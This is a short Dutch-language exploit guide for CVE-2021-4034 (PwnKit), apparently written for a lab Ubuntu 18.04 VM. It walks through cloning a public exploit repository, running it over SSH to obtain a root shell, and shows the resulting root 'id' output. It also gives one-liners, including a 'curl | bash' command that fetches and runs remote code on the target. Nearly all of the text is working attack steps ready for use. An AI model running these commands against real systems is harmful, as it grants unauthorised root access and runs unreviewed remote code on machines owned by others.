# Exploitgids CVE-2021-4034 (PwnKit)

Lokale privilege-escalatie in `pkexec` (Polkit) op Ubuntu 18.04.

## 1. Voorwaarden

- SSH-toegang als `tester` op de Ubuntu VM.
- Internet-connectie om GitHub te bereiken.

## 2. Exploit-repository

https://github.com/cd80-ctf/CVE-2021-4034
alle credits gaan naar cd80-ctf voor de code om de exploit uit te voeren.

## 3. Handmatige stappen

1. SSH naar Ubuntu:

   ```bash
   ssh tester@<ubuntu_ip>
   ```

2. Clone, compile & run:
   ```bash
   git clone https://github.com/cd80-ctf/CVE-2021-4034.git
   cd CVE-2021-4034
   chmod +x run.sh
   ./run.sh
   ```
3. Je hebt nu een root shell:
   ```bash
   # id
   uid=0(root) gid=0(root) groups=0(root)
   ```

## 4. One-liners (geen handmatig clone)

### 4.1 Met git

```bash
ssh tester@<ubuntu_ip> \
  'git clone --depth 1 https://github.com/cd80-ctf/CVE-2021-4034.git \
   && cd CVE-2021-4034 \
   && chmod +x run.sh \
   && ./run.sh'
```

### 4.2 Met curl â†’ bash

```bash
ssh tester@<ubuntu_ip> 'curl -sL https://raw.githubusercontent.com/cd80-ctf/CVE-2021-4034/main/run.sh | bash'
```

## Credits

- Exploit & POC: **cd80-ctf**
  https://github.com/cd80-ctf/CVE-2021-4034
- Originele ontdekking, analyse & writeup : **Qualys Security**
